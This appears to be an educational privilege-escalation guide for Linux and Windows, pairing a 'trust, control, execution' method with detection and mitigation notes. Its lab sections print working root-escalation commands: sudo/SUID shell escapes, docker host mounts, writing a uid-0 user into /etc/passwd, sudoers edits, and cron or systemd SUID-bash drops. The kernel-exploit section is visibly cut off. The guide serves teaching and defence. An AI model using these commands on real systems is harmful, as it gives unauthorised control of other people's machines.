🧠 The Core Mental Model

Privilege escalation is not about memorizing exploits. It's about answering one question repeatedly:

"Where does a privileged process trust something that I can control?"

That "something" could be a file, a path, a service, a token, a library, a registry key, or an environment variable.

🧠 The PrivEsc Mindset

Don't learn techniques. Learn to think. Every privilege escalation — no matter how novel — follows the same logical structure. Master this and you can discover paths you've never seen before.

The Universal PrivEsc Chain

TRUST
→
CONTROL
→
EXECUTION
→
BOUNDARY
→
IMPACT
Trust

A privileged process trusts something: a file, path, token, service, library, or environment variable.

Control

You can influence that trusted resource — you can write, replace, redirect, or manipulate it.

Execution

The privileged process executes, loads, or reads your controlled resource at a predictable moment.

Boundary

The execution actually crosses a privilege boundary — from your context into root/SYSTEM/Administrator.

Eight Questions for Every Finding

Whenever you discover something interesting, ask these questions in order:

  1. What is privileged here? — What runs as root or SYSTEM?
  2. What does it trust? — What file, path, service, or resource does it rely on?
  3. Who controls that trusted resource? — Can I write to it? Can I replace it? Can I redirect it?
  4. Can I modify it? — Permissions, ACLs, ownership?
  5. Under which account does it execute? — root? SYSTEM? A service account?
  6. When does it execute? — On boot? On schedule? On user action?
  7. Can I influence the input? — Arguments, environment, configs?
  8. Can I reliably cross the privilege boundary? — Is it deterministic, or race-dependent?
🧠 Why this matters

If you can answer all eight questions with confidence, you understand the vulnerability — not just the exploit command. That's the difference between copy-pasting and actually pentesting.

📘 Privilege Escalation Fundamentals

What is Privilege Escalation?

Privilege escalation is the act of exploiting a bug, design flaw, or configuration oversight in an operating system or software application to gain elevated access to resources that are normally protected from an application or user.

What

Gaining access to a security principal with more rights than your current one.

Why

Low-priv shells are limited. To read sensitive data, persist, move laterally, or own the host, you need higher privilege.

How

Find a trusted resource (file, path, service, token) that a privileged process uses and that you can influence.

When

After initial access and enumeration — when you understand the target well enough to identify a boundary weakness.

Vertical Escalation

Going from a lower-privileged user to a higher-privileged one. Example: john → root (Linux) or user01 → Administrator/SYSTEM (Windows).

Horizontal Escalation

Moving from one user to another user with similar privileges. Example: userA → userB (both normal users). Often used for lateral movement.

Local vs Remote

  • Local privilege escalation: You already have a shell on the target and escalate from within.
  • Remote privilege escalation: Exploiting a network service to gain higher privileges without prior local access.

🔍 Enumeration Methodology

Enumeration is often the most important part of privilege escalation. The exploit is the last step. Before you can escalate, you must understand what you have, what the system trusts, and where the boundary is weak.
🧠 The Enumeration Question

For every privileged process, ask:

"What does it trust, and can I influence that trust?"

What information do I need?

  1. Identify current user — Who am I? What can I do?
  2. Identify privileges — sudo rights, tokens, capabilities.
  3. Identify OS — Linux distro, kernel version, Windows build.
  4. Identify architecture — x86, x64, ARM.
  5. Identify hostname — Context and network role.
  6. Identify network config — Interfaces, routes, listening ports.
  7. Identify running processes — What's running as root/SYSTEM?
  8. Identify services — Any writable configs or binaries?
  9. Identify scheduled tasks/jobs — Cron, Task Scheduler.
  10. Identify installed software — Vulnerable versions?
  11. Identify files and permissions — SUID, writable configs, ACLs.
  12. Identify credentials/secrets — Config files, history, registry.
  13. Identify misconfigurations — PATH, LD_PRELOAD, unquoted paths.
  14. Identify possible escalation paths — Correlate findings.
  15. Validate safely — Test in a lab, not on production.
Automated enumeration is a starting point, not a conclusion. Always manually verify findings. Tools produce false positives.

⚖️ Vulnerability vs Misconfiguration

Not every weakness is a vulnerability. The remediation, severity, and exploitation approach differ significantly. Learn to distinguish them.
TypeExampleRemediation approach
MisconfigurationWeak sudo ruleChange config, tighten policy
Weak permissionWritable service binaryFix ACLs / ownership
Design issueDangerous trust relationshipRedesign, defense in depth

🐧 Linux — Users & Groups

Group membership is access. Being in a group gives you access to resources that group controls. Determine whether that access crosses a privilege boundary.
What

Your UID, GID, group memberships, and the accounts on the system.

Why

Groups like sudo, docker, lxd, disk, adm, shadow, video, libvirt, systemd-journal provide access to privileged resources.

How

Use id, groups, /etc/passwd, /etc/group.

When

Always first — before anything else.

Dangerous / Interesting Groups

GroupWhy it mattersReliability
sudoCan run commands as root (per sudoers)🟢 Usually direct
dockerCan mount host filesystem via container🟢 Usually direct
lxd / lxcCan start privileged containers🟢 Usually direct
diskRaw disk access — read/write anywhere🟢 Usually direct
admRead system logs (may contain secrets)🟡 Indirect
shadowRead /etc/shadow🟡 Depends on hash cracking
videoAccess to framebuffer, DRM🟡 Environment-dependent
libvirtManage VMs, access to disk images🟡 Environment-dependent
systemd-journalRead all journal logs🟡 Indirect (secrets in logs)
Do not say "member of group X = root." Group membership gives access. You must still determine whether that access crosses a privilege boundary.
Linux
id                # Show UID, GID, groups
whoami            # Current username
groups            # Groups current user belongs to
w                 # Who is logged in
last              # Last logged-in users
cat /etc/passwd   # User accounts
cat /etc/group    # Group memberships
🎯 Lab Exploitation — Dangerous Group (docker, lxd, disk)

If you're in the docker group, you can mount the host filesystem inside a container:

Linux
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now you're root on the host filesystem

If you're in the lxd group:

Linux
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage mycontainer -c security.privileged=true
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
lxc start mycontainer
lxc exec mycontainer /bin/sh

If you're in the disk group:

Linux
debugfs /dev/sda1   # Or use dd to read /etc/shadow directly
dd if=/dev/sda1 of=/tmp/rootfs.img

🔑 Linux — Sudo Misconfiguration

🟢 Reliable — usually deterministic
Sudo is the most common Linux PrivEsc vector. If you can run a command as root, you often have a path — either directly or through that command's features.
What

Sudo allows a permitted user to execute a command as another user (usually root) according to rules in /etc/sudoers.

Why dangerous

Many binaries have features (shell escapes, file writes, plugin loading) that let you run arbitrary commands as root even if the binary itself isn't bash.

How to enumerate

sudo -l lists your allowed commands. Look for NOPASSWD, wildcards, and dangerous binaries.

When

Immediately after id — it's the fastest potential win.

Linux
sudo -l           # List allowed sudo commands for current user

Exploitability Checklist

✓ Verify before exploiting [✓] A sudo rule exists for your user
[✓] The allowed binary has a known escape or command exec
[✓] The rule allows running as root (or a privileged user)
[✓] NOPASSWD or you know the password
[✓] No restrictions (wildcards, env_keep, etc.) block the escape
[ ] The binary is not a restricted sudo plugin

Detection Perspective

🔴 Attacker sees sudo -l output showing a dangerous binary or NOPASSWD rule.
🔵 Defender sees Unusual sudo invocations, especially of editors/shells by non-admins. Audit log entries like sudo: user : TTY=... ; COMMAND=/usr/bin/find.
🟢 Mitigation Least privilege. Avoid NOPASSWD for dangerous binaries. Use sudoers.d with tight command paths. Log sudo.
🎯 Lab Exploitation — Common Sudo Binaries

If sudo -l shows you can run any of the following as root (typically with NOPASSWD), these are direct paths to a root shell in a lab. All examples assume the binary is listed in your sudo rights.

find

Linux
sudo find . -exec /bin/bash \; -quit

vim / nano / less / more

Linux
sudo vim -c ':!/bin/bash'
sudo less /etc/hosts   # Then type !/bin/bash inside less

awk / perl / python / ruby / lua

Linux
sudo awk 'BEGIN {system("/bin/bash")}'
sudo perl -e 'exec "/bin/bash";'
sudo python3 -c 'import os; os.system("/bin/bash")'

tar / zip / cp / mv / tee

Linux
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
echo "user ALL=(root) NOPASSWD: ALL" | sudo tee -a /etc/sudoers

env / nice / nohup / timeout / xargs / strace / ltrace

Linux
sudo env /bin/bash
sudo nice /bin/bash
sudo timeout 1 /bin/bash
sudo xargs -a /dev/null /bin/bash
Reference: GTFOBins (gtfobins.github.io) documents escape sequences for hundreds of binaries. In a lab, use it to find the escape for your specific binary. But remember: understanding why the escape works is more valuable than copying the one-liner.
🧠 Mental model for sudo

Ask: "Does this binary have a way to run another command, read a file, or write a file as root?" If yes, you likely have escalation.

If it doesn't work

  • Check if sudo requires a password you don't have.
  • Check if the binary drops privileges or uses secure execution.
  • Check if env_reset or secure_path in sudoers blocks your PATH injection.
  • Check if the sudo version has hardened against that escape.

⚙️ Linux — SUID / SGID

🟢 Reliable — if the binary is exploitable
SUID is a mechanism, not a vulnerability. The vulnerability is when a SUID binary can be made to do something the developer didn't intend — usually by controlling its input, environment, or dependencies.
What

SUID (Set User ID): When executed, runs with the privileges of the file's owner (often root). SGID: Same, but group privileges.

Why dangerous

If the SUID binary calls another command without a full path, loads a library from a writable location, or trusts environment variables, you can hijack that trust.

How to enumerate

find / -perm -4000 -type f 2>/dev/null for SUID, -2000 for SGID.

When

After sudo — SUID binaries are a common second look.

Linux
find / -perm -4000 -type f 2>/dev/null   # Find SUID binaries
find / -perm -2000 -type f 2>/dev/null   # Find SGID binaries
ls -la /path/to/binary                    # Check the 's' in permissions

Exploitability Checklist

✓ Verify before exploiting [✓] SUID binary exists and is owned by root
[✓] Binary calls another command without absolute path (PATH hijack)
[✓] OR binary loads a shared library from a writable path
[✓] OR binary trusts environment variables (LD_PRELOAD, etc.)
[✓] OR binary has a known escape (GTFOBins)
[✓] OR binary has a memory corruption bug
[✓] Your user can trigger the vulnerable path

Detection Perspective

🔴 Attacker sees Unexpected SUID binary in find output, especially in /tmp, /home, or custom paths.
🔵 Defender sees Unusual execution: an interactive shell child process of a SUID binary. File integrity tools (AIDE, Tripwire) flag new SUID bits.
🟢 Mitigation Remove unnecessary SUID bits. Monitor SUID binaries. Use nosuid mount option where possible.
🎯 Lab Exploitation — SUID Binary Abuse

If the SUID binary is a common tool (find, vim, nano, python, etc.), it likely has a GTFOBins escape. In a lab:

Linux
# Example: SUID find
/usr/bin/find . -exec /bin/bash -p \; -quit
# -p preserves privileges when bash starts

# Example: SUID python
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Example: SUID cp — copy /etc/shadow to a readable location
/usr/bin/cp /etc/shadow /tmp/shadow.txt
cat /tmp/shadow.txt
Lab Exploitation — PATH Hijack of a SUID Binary

If the SUID binary calls an external command without an absolute path (e.g., system("cat /etc/shadow")), you can hijack PATH:

Linux
# 1. Create malicious "cat" in a writable dir
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
# 2. Prepend to PATH
export PATH=/tmp:$PATH
# 3. Trigger the SUID binary
/path/to/vulnerable-suid
Lab Exploitation — SUID Binary That Copies Files

If a SUID binary copies files, you can often use it to copy /bin/bash and set SUID on it:

Linux
/path/to/suid-cp /bin/bash /tmp/bash
chmod +s /tmp/bash
/tmp/bash -p
🧠 Mental model for SUID

Ask: "What does this binary do as root that I could influence?" Look at strings, check what it executes, check what files it reads/writes.

If it doesn't work

  • The binary uses absolute paths for everything.
  • It drops privileges immediately (setuid/setgid to real UID).
  • It clears environment variables.
  • The kernel ignores LD_PRELOAD for SUID binaries (which it does by default).

📂 Linux — File Permissions

What

Linux permissions: owner, group, other. Read (4), write (2), execute (1).

Why

Writable privileged files (owned by root but writable by you) are a classic escalation path.

How

ls -la, find / -writable, stat.

When

After identifying privileged processes — what files do they trust?

Linux
ls -la /path/to/file
chmod 755 file      # rwxr-xr-x
chown user:group file
stat /path/to/file  # Detailed metadata
🎯 Lab Exploitation — Writable /etc/passwd

If /etc/passwd is writable, you can add a root-equivalent user:

Linux
# 1. Generate a password hash
openssl passwd -1 -salt hacked password123
# Output: $1$hacked$xxxxxxxxxxxxxxxxxxxxxx

# 2. Append a new root user
echo 'hacker:$1$hacked$xxxxxxxxxxxxxxxxxxxxxx:0:0:root:/root:/bin/bash' >> /etc/passwd

# 3. Switch to the new user
su hacker   # password: password123
id          # uid=0(root) — you are root

✏️ Linux — Writable Files & Directories

🟡 Environment-dependent — needs a privileged consumer
What

Files or directories you can modify that a privileged process also uses.

Why

If root runs a script you can edit, or reads a config you can modify, you control root's behavior.

How

find / -writable -type f 2>/dev/null, find / -writable -type d 2>/dev/null.

When

After identifying services, cron, or SUID binaries that reference files.

Linux
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null

Exploitability Checklist

✓ Verify before exploiting [✓] A privileged process reads/executes this file
[✓] That process runs as root or another privileged user
[✓] You can write to the file or its parent directory
[✓] The process executes after your modification
[✓] The file is not validated by signature/hash
Common false positive: A writable file that no privileged process ever touches. Writable ≠ exploitable.
🎯 Lab Exploitation — Writable /etc/shadow Backup

If you find a writable backup of /etc/shadow, you can replace root's hash:

Linux
# 1. Generate new hash
openssl passwd -1 -salt newsalt mynewpassword
# 2. Edit the writable shadow backup and replace root's hash
# 3. Copy it back if you have write access to /etc/shadow

🛤️ Linux — PATH Hijacking

🟢 Reliable — if the privileged process respects PATH
PATH hijacking is the classic "trust the lookup" vulnerability. It works because the shell searches directories in order — and if a privileged script relies on that search, you can insert yourself earlier in the list.
What

PATH is an environment variable that tells the shell where to look for commands, in order.

Why it works

If a root script calls cat (no path), the shell searches PATH. If a writable directory is earlier in PATH than /bin, your cat runs as root.

How

echo $PATH, then look for writable dirs. In a lab, prepend /tmp and place a malicious binary.

When

When a privileged process calls a command without an absolute path.

Linux
echo $PATH
export PATH=/tmp:$PATH  # Add /tmp to front (lab only)

Exploitability Checklist

✓ Verify before exploiting [✓] Privileged process calls an external command by name (no path)
[✓] Your user can write to a directory earlier in PATH than the real command
[✓] The privileged process inherits your PATH or a controllable PATH
[✓] No secure_path restriction applies (sudo usually has one)
[ ] The process doesn't use bash -p or a restricted shell

Detection Perspective

🔴 Attacker sees $PATH includes writable dirs like /tmp, /home/user/bin, etc.
🔵 Defender sees A process spawned from an unusual path (e.g., /tmp/cat) inheriting root privileges.
🟢 Mitigation Use absolute paths in scripts. Use secure_path in sudoers. Don't let privileged processes inherit untrusted PATH.
🎯 Lab Exploitation — PATH Hijack

Assumes a privileged script or SUID binary calls a command without a full path (e.g., system("cat /etc/shadow")).

Linux
# 1. Identify the command being called (e.g., "cat")
# 2. Create a fake version in /tmp
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat

# 3. Prepend /tmp to PATH
export PATH=/tmp:$PATH

# 4. Trigger the privileged process
/path/to/vulnerable-binary

# You should now have a root shell (id → uid=0)
🧠 Mental model for PATH hijacking

Ask: "Does this privileged script or binary call any command without a full path?" If yes, and you can write to a directory earlier in PATH, you win.

If it doesn't work

  • Sudo's secure_path resets PATH — you can't inject.
  • The script uses absolute paths.
  • The process uses bash -p which ignores PATH for security.
  • You don't have write access to an earlier PATH directory.

⏰ Linux — Cron Jobs

🟢 Reliable — if the trigger is predictable
Cron is a trust machine. It runs scripts on a schedule as a specified user — often root. If any part of what it runs is under your control, you have a path to that user's privileges.
What

Cron runs scheduled tasks at fixed times or intervals.

Why dangerous

Cron jobs often run as root, use relative paths, and reference scripts in writable directories.

How to enumerate

cat /etc/crontab, ls -la /etc/cron.*, crontab -l, and check for writable scripts referenced.

When

After sudo and SUID — cron is a common third path.

Linux
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/
systemctl list-timers --all   # Check systemd timers (modern replacement)

Exploitability Checklist

✓ Verify before exploiting [✓] Cron job runs as root (check the user field in /etc/crontab)
[✓] The script or binary it runs is writable by you
[✓] OR the directory it lives in is writable
[✓] OR it uses a relative path and PATH is writable
[✓] The schedule is predictable (you know when it runs)
🎯 Lab Exploitation — Writable Cron Script

If a cron job runs a script as root and you can write to that script:

Linux
# 1. Identify the writable script
ls -la /path/to/cron-script.sh

# 2. Modify it to drop a SUID bash
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /path/to/cron-script.sh

# 3. Wait for cron to run (check schedule)
# 4. Execute the SUID bash
/tmp/rootbash -p
id   # uid=0(root)
Lab Exploitation — Writable Directory in Cron Path

If a cron job uses a relative path or an unspecified PATH:

Linux
# If the cron job runs a script that calls a command without a full path
# Create a malicious version in a directory the cron job searches
echo '/bin/bash -p' > /writable-dir/command-name
chmod +x /writable-dir/command-name
# Wait for cron to trigger
🧠 Mental model for cron

Ask: "What does this job run, as whom, and can I modify any part of it — the script, the directory, the PATH, or the binary it calls?"

Modern Linux note: Since Debian 12 (Bookworm) and other modern distributions, many scheduled tasks use systemd timers instead of traditional cron. Check systemctl list-timers --all alongside cron files.

If it doesn't work

  • The cron job runs as a non-root user.
  • The script or directory is not writable.
  • The script uses absolute paths and you can't touch any referenced binary.
  • You can't wait for the trigger (e.g., it runs once a day and you're impatient).

🔧 Linux — Systemd Services

🟢 Reliable — if unit or binary is writable
What

Systemd manages services via unit files in /etc/systemd/system/ and related dirs.

Why dangerous

Writable unit files or service binaries let you run commands as the service user (often root).

How

systemctl list-units --type=service, then check ExecStart paths and permissions.

When

When you spot a custom service or a writable unit file.

Linux
systemctl list-units --type=service
find /etc/systemd/system -writable 2>/dev/null
cat /etc/systemd/system/*.service | grep ExecStart
🎯 Lab Exploitation — Writable Systemd Unit

If you can write to a systemd unit file that runs as root:

Linux
# 1. Modify the ExecStart to run a reverse shell or add SUID
echo 'ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash"' >> /etc/systemd/system/vulnerable.service

# 2. Reload and restart the service
systemctl daemon-reload
systemctl restart vulnerable.service

# 3. Execute SUID bash
/tmp/rootbash -p

🧩 Linux — Capabilities

🟢 Reliable — if a dangerous capability is set
What

Capabilities break root privileges into smaller, assignable pieces (e.g., cap_setuid, cap_sys_admin).

Why dangerous

Some capabilities allow direct privilege escalation — cap_setuid lets a binary change its UID to 0.

How

getcap -r / 2>/dev/null to find binaries with capabilities.

When

When standard SUID/sudo paths are empty — capabilities are a common hidden vector.

Linux
getcap -r / 2>/dev/null
setcap cap_setuid+ep /path/to/binary  # Lab example

Dangerous capabilities

  • cap_setuid — change UID to 0.
  • cap_setgid — change GID.
  • cap_sys_admin — mount filesystems, many privileged operations.
  • cap_sys_ptrace — attach to processes.
  • cap_dac_read_search — bypass file read permissions.
  • cap_dac_override — bypass file write permissions.

Exploitability Checklist

✓ Verify before exploiting [✓] A binary has a capability like cap_setuid+ep
[✓] You can execute that binary
[✓] The binary's functionality allows you to abuse the capability
[✓] The capability is effective (not just permitted)
[✓] The kernel supports the capability in this context
🎯 Lab Exploitation — Capability Abuse

cap_setuid — if a python binary has cap_setuid:

Linux
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

cap_dac_read_search — read files you normally can't (e.g., /etc/shadow):

Linux
/path/to/binary-with-cap /etc/shadow

cap_sys_admin — mount filesystems or manipulate namespaces. In a lab, this can often be leveraged to escape containers or mount the host disk.

💥 Linux — Kernel Exploits

🟡 Environment-dependent — risky, version-specific
Kernel exploits are a last resort. They can crash the system, require exact version matches, and are often unreliable. Try configuration-based paths first.
What

🪟 Windows — Fundamentals

Windows privilege is about tokens, integrity levels, and rights. Unlike Linux's simpler user/group model, Windows has multiple layers — and privilege escalation usually means obtaining or abusing a token with higher integrity or specific rights.
What

Windows security principals: users, groups, SIDs, tokens, integrity levels, and privileges.

Why

Understanding the model is required to know which boundary you're crossing and why a technique works.

How

whoami /priv, whoami /groups, whoami /all.

When

First thing after getting a shell — know what you have.

Users & Groups: Windows uses Security Identifiers (SIDs). SYSTEM (S-1-5-18) is the highest privilege. Administrator is a member of Administrators group.

Tokens: Access tokens define what a process can do. Integrity levels: Low, Medium, High, System.

UAC: User Account Control — even admins run with a filtered token until elevation.

🧠 Mental model for Windows

Ask: "What token does this process have, what integrity level is it, and what can I do to get a higher one?"

🎫 Windows — Tokens & Impersonation

Tokens are the currency of Windows privilege. Every process runs with a token. Every thread can impersonate. Understanding this chain is the key to Windows PrivEsc.
User → Access Token → Process → Thread → Impersonation Token → Security Context
Primary Token

Assigned to a process at creation. Defines the process's default security context.

Impersonation Token

Assigned to a thread. Allows a thread to temporarily run as another user.

Impersonation Levels

Anonymous, Identify, Impersonate, Delegate — control how far the impersonation goes.

Integrity Levels

Low, Medium, High, System — access control beyond ACLs.

Why SeImpersonatePrivilege matters

If a service runs with this privilege and you can make it connect to a malicious service you control, you can capture its token — potentially SYSTEM. Tools like Juicy Potato, PrintSpoofer, and RoguePotato exploit this.

CMD
whoami /priv  # Look for SeImpersonatePrivilege
whoami /all   # Full token info including integrity level

Exploitability Checklist

✓ Verify before exploiting [✓] Your token has SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
[✓] A privileged service (SYSTEM) will connect to a listener you control
[✓] You can host a malicious RPC/HTTP/COM service
[✓] Compatible exploit for your Windows version (Potato family varies)
[✓] No AppContainer or restricted token blocking you

Detection Perspective

🔴 Attacker sees SeImpersonatePrivilege in whoami /priv.
🔵 Defender sees SYSTEM process creating a connection to a non-standard listener (e.g., 127.0.0.1:9999). Event ID 4624 with unusual logon type.
🟢 Mitigation Remove unnecessary SeImpersonatePrivilege from service accounts. Patch. Use AppContainer isolation.

📁 Windows — Unquoted Service Path

🟢 Reliable — if writable earlier path exists
A space in a service path is a trust gap. Windows tries each space-separated possibility in order — and if you can write to an earlier one, you hijack the execution.
What

A service path with spaces that isn't quoted, e.g., C:\Program Files\Vuln Service\svc.exe.

Why dangerous

Windows tries C:\Program.exe first, then C:\Program Files\Vuln.exe, etc. If you can write to an earlier path, your binary runs.

How

Use PowerShell to find unquoted service paths (modern replacement for deprecated wmic).

When

When you spot an unquoted path with spaces — always check writability.

PowerShell
Get-CimInstance Win32_Service | Where-Object { $_.PathName -notlike '"*' -and $_.PathName -like '* *' } | Select-Object Name, DisplayName, PathName, StartMode
Deprecation notice: The wmic utility is deprecated since Windows 10 21H1 and is being removed from newer Windows 11 versions. Use Get-CimInstance instead.
App → Search order → Expected path → Writable earlier path → Your binary runs

Exploitability Checklist

✓ Verify before exploiting [✓] Service path contains spaces
[✓] Path is NOT quoted
[✓] A directory earlier in the path is writable by you
[✓] Service runs as SYSTEM or a privileged account
[✓] Service restarts automatically or you can reboot

🧪 Practical Labs

These labs are designed for your own VMs, CTF platforms, or intentionally vulnerable machines (e.g., TryHackMe, HackTheBox, VulnHub).

🐧 Linux Lab 1 — Basic Enumeration

Objective: Identify current user, groups, OS, and basic system info.

Commands: id, uname -a, cat /etc/os-release, ip a, ss -tulpn.

What to look for: Unusual group memberships, old kernel, unexpected listening services.

🐧 Linux Lab 2 — Sudo Misconfiguration

Objective: Find and safely exploit a sudo rule allowing a dangerous binary.

Setup: In a lab VM, add user ALL=(ALL) NOPASSWD: /usr/bin/find to sudoers.

Validation: Run sudo find . -exec /bin/bash \; -quit to spawn a root shell.

Remediation: Remove unnecessary sudo rules, use absolute paths, restrict commands.

🐧 Linux Lab 3 — SUID PATH Hijack

Objective: Identify a vulnerable SUID binary and exploit PATH injection.

Setup: Create a SUID script that calls cat without full path.

Validation: Place a malicious cat in /tmp, prepend /tmp to PATH, execute the SUID script.

Root cause: Privileged process trusts PATH lookup.

🐧 Linux Lab 4 — Cron

Objective: Exploit a writable cron script.

Setup: Add a cron job running a script as root that is writable by your user.

Validation: Modify the script to copy /bin/bash and set SUID, wait for cron, execute.

🪟 Windows Lab 1 — Basic Enumeration

Objective: Gather user, group, privilege, and system information.

Commands: whoami /priv, systeminfo, net user, ipconfig.

🪟 Windows Lab 2 — Unquoted Service Path

Objective: Identify and exploit an unquoted service path.

Setup: Create a service with a path like C:\Program Files\Vuln Service\service.exe (unquoted) and ensure C:\Program.exe is writable.

🔧 Troubleshooting

When a technique doesn't work, don't guess. Walk through the checklist systematically. The reason is almost always one of: permissions, context, version, environment, or timing.

"My command returns nothing."

Check if the command exists, if you have permission, and if the path is correct. Use 2>/dev/null carefully — it can hide errors.

"The expected privilege is not available."

Verify with whoami /priv or sudo -l. Sometimes UAC filtering removes privileges from your token.

"The service does not restart."

You may need to reboot, or the service may have dependencies. Check service status and event logs.

"The file is writable but escalation does not work."

Maybe the service doesn't run as SYSTEM, or the binary is not executed with the privileges you expect. Verify the execution context.

"The SUID binary exists but is not exploitable."

Not all SUID binaries are vulnerable. It may drop privileges, use absolute paths, or not call external commands.

"PATH hijack didn't work with sudo."

Sudo often enforces secure_path. Check sudo -l output and /etc/sudoers for secure_path and env_reset.

"The Windows privilege exists but the expected technique doesn't work."

Privileges alone aren't enough. You need a compatible exploit and often a specific condition (a service to connect, a writable path, etc.). Check versions, AppContainer restrictions, and required APIs.

"wmic doesn't exist on my system."

The wmic utility is deprecated and removed from newer Windows 11 builds. Use Get-CimInstance instead.

"ifconfig/netstat says command not found."

Modern Linux distributions often don't include net-tools by default. Use ip addr instead of ifconfig, and ss -tulpn instead of netstat.

🚫 Common False Positives

"Interesting" does not mean "exploitable."

  • SUID but not exploitable: Binary drops privileges or uses secure coding.
  • Writable file but not useful: Not executed by a privileged process.
  • Privilege present but restricted: Token has the privilege but policy prevents abuse.
  • Service running as SYSTEM but not writable: No path to modify it.
  • Credential found but expired/invalid: Always test credentials before relying on them.
  • Vulnerable version but exploit incompatible: Check architecture, offsets, and prerequisites.
  • Group membership without exploitable access: Being in a group does not guarantee a path.
Always manually verify. Automation highlights possibilities; you must confirm the root cause.

❓ Final Knowledge Check

1. What is the difference between vertical and horizontal privilege escalation?

Vertical: Gaining higher privileges (e.g., user → root/SYSTEM). Horizontal: Moving to another user with similar privileges.

2. You have a low-privileged Linux shell. What are the first 10 things you would enumerate and why?

1. id (who am I?) 2. sudo -l (what can I run?) 3. SUID binaries 4. Cron jobs 5. Running processes 6. Network ports 7. Kernel version 8. Writable files 9. Capabilities 10. Credentials in files.

3. You find a Windows service running as SYSTEM. What would you check before considering it an escalation path?

Check if the service binary or its directory is writable, if the path is unquoted, if the service configuration can be modified, and if the service restarts automatically.

4. Why is automated enumeration not enough?

Tools produce false positives. They highlight "interesting" findings but cannot prove exploitability. Manual verification is always required.

5. Explain PATH hijacking in your own words — what, why, how?

What: Abusing the shell's PATH search order. Why: A privileged script calls a command without a full path, so the shell searches PATH. How: Insert a writable directory earlier in PATH and place a malicious command there. The privileged script executes your command as its user.

6. You find a writable file. Is it automatically exploitable? Explain.

No. It is interesting, not necessarily exploitable. You must verify: (1) a privileged process reads or executes it, (2) that process runs as root/SYSTEM, (3) you can write to it, (4) the process executes after your modification. Otherwise it's a false positive.

7. Describe a realistic Linux PrivEsc chain using three findings.

Example: (1) User is in the adm group → can read /var/log/. (2) Log contains a password for another user. (3) That user has a sudo rule for a dangerous binary → root.

8. Why are reliability ratings useful in privilege escalation?

They inform exploitation strategy. A 🟢 reliable technique is worth trying first. A 🟡 environment-dependent one requires more setup and may fail. A 🔴 risky one (like a kernel exploit) can crash the system — use as a last resort.

9. What command replaces wmic for service enumeration on modern Windows?

Get-CimInstance Win32_Service. The wmic utility is deprecated since Windows 10 21H1 and removed from newer Windows 11 builds.

10. What commands replace ifconfig and netstat on modern Linux?

ip addr replaces ifconfig, and ss -tulpn replaces netstat -tulpn. These are part of the iproute2 package, which is standard on modern distributions.
